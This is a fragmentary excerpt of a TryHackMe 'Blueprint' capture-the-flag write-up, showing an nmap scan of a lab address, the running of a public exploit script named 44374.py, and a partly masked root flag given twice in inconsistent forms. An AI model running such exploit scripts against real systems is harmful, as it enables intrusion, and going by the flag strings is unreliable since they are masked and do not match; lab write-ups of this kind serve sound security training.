...
```
bibo318@parrot:~/CTFs/tryhackme/Blueprint$ sudo nmap -A -sS -sC -sV -O 10.10.184.207
...
```
bibo318@parrot:~/CTFs/tryhackme/Blueprint$ python3 44374.py
...
type root.txt.txt
THM{V0N318*****aea1e3ce6fe7f89e10cea833ae009bee}
```
...
`THM{V0N318*****aea1e3ce6fe7f89e10cea833ae009bee12**123:))}`
